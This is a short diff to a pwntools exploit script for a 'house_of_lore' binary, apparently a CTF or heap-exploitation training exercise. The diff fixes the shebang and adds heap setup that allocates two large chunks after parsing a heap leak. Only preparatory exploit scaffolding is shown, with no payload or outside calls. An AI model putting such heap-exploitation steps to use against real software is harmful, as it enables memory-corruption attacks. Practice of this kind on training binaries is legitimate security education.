@@ -1,4 +1,4 @@
-#!/usr/bin/python3
+#!/usr/bin/env python3
 from pwn import *
 
 elf = context.binary = ELF("house_of_lore")
@@ -56,6 +56,10 @@ heap = int(io.recvline(), 16)
 username = b"A"*8
 io.sendafter(b"username: ", username)
 io.recvuntil(b"> ")
+
+# Request 2 large chunks
+chunk_A = malloc(0x3f8)
+chunk_B = malloc(0x3f8)
 
 # =============================================================================
 
